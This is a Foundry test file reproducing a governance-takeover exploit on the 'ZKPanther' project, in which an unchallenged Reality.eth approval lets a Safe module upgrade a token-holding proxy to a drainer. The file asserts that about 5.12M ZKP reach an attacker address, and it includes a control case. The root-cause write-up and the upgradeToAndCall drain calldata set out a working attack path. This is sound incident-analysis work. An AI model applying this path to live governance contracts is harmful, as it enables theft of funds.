// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import {
    Exploit,
    ZKPToken,
    Safe,
    EIP173Proxy,
    RealityModule,
    RealityOracle,
    IOracle,
    Drainer
} from "./2026-08-ZKPantherGovernanceUpgrade.sol";

// ZKPanther (Base) — governance takeover root-cause reproduction.
// A single unchallenged Reality.eth "yes" (0.5 ETH bond) lets the RealityModule
// exec ANY transaction as the Panther Safe. Because the Safe owns upgradeable
// EIP-173 proxies holding ZKP, the attacker's proposal makes the Safe
// upgradeToAndCall a ZKP-holding proxy to a drainer — pulling ~5.12M ZKP out.
contract ZKPantherGovernanceTakeover is Test {
    address internal constant ATTACKER = 0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6;
    uint256 internal constant STOLEN_ZKP = 5_124_773_626006184526790998;

    bytes32 internal constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function test_governanceTakeover_drainsViaRealityModule() public {
        Exploit exp = new Exploit();
        exp.run();

        ZKPToken zkp = exp.zkp();
        EIP173Proxy proxy = exp.proxy();
        Drainer drainer = exp.drainer();

        uint256 attackerZkp = zkp.balanceOf(ATTACKER);
        uint256 proxyZkp = zkp.balanceOf(address(proxy));
        address impl = address(uint160(uint256(vm.load(address(proxy), IMPL_SLOT))));

        emit log_named_decimal_uint("ZKP drained to attacker", attackerZkp, 18);
        emit log_named_decimal_uint("ZKP left on proxy       ", proxyZkp, 18);
        emit log_named_address("proxy implementation now", impl);

        // Root cause realized: proxy implementation swapped to the drainer by the Safe.
        assertEq(impl, address(drainer), "proxy was not upgraded to the drainer via governance");
        // The full ~5.12M ZKP was drained to the attacker EOA through the module.
        assertEq(attackerZkp, STOLEN_ZKP, "attacker did not receive the drained ZKP");
        assertEq(proxyZkp, 0, "proxy still holds ZKP");
    }

    // Control: without an approved Reality "yes", executeProposal reverts at the
    // exec gate — the module cannot act as the Safe, so no upgrade / no drain.
    function test_control_noApprovalNoExec() public {
        ZKPToken zkp = new ZKPToken();
        Safe safe = new Safe();
        Drainer benignImpl = new Drainer();
        EIP173Proxy proxy = new EIP173Proxy(address(safe), address(benignImpl));
        zkp.mint(address(proxy), STOLEN_ZKP);

        RealityOracle oracle = new RealityOracle();
        RealityModule module = new RealityModule(address(safe), IOracle(address(oracle)), 0.5 ether, 0);
        safe.enableModule(address(module));

        Drainer drainer = new Drainer();
        bytes memory drainData = abi.encodeWithSelector(Drainer.drain.selector, ATTACKER, address(zkp));
        bytes memory execData =
            abi.encodeWithSelector(EIP173Proxy.upgradeToAndCall.selector, address(drainer), drainData);
        string memory proposalId = "honest-proposal";
        bytes32 txHash = module.getTransactionHash(address(proxy), 0, execData, 0, 0);
        bytes32[] memory txHashes = new bytes32[](1);
        txHashes[0] = txHash;
        module.addProposal(proposalId, txHashes);

        // NO oracle.submitAnswer(...) → resultFor == 0 → the exec gate rejects.
        vm.expectRevert(bytes("Transaction was not approved"));
        module.executeProposalWithIndex(proposalId, txHashes, address(proxy), 0, execData, 0, 0);

        assertEq(zkp.balanceOf(ATTACKER), 0, "no drain should have occurred");
    }
}
